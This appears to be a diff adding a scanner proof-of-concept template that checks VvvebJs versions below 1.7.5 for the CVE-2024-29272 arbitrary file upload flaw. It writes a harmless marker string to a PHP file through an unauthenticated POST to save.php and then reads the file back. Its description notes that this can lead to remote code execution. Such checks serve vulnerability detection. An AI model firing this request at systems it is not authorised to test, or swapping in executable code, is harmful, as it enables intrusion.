@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "验证 VvvebJs 页面编辑器任意文件上传漏洞。通过向 save.php 发送无认证的 POST 请求，利用 sanitizeFileName 参数缺失文件类型与路径校验，将测试内容写入 demo/landing/index.php 文件。随后通过 GET 请求验证文件内容是否成功写入，从而确认漏洞存在。攻击者可利用此漏洞上传恶意脚本实现远程代码执行。"
+id = "POC-AVE-2024-0018"
+name = "VvvebJs < 1.7.5 Arbitrary File Upload RCE PoC"
+severity = "high"
+tags = ["ave-2024-0018"]
+vuln_id = [
+    "CVE-2024-29272",
+    "AVE-2024-0018",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/save.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "file=demo/landing/index.php&html=AVE_CVE_2024_29272_POC_TEST"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "word"
+words = ["File saved"]
+
+[[poc.requests]]
+method = "GET"
+path = "/demo/landing/index.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "word"
+words = ["AVE_CVE_2024_29272_POC_TEST"]
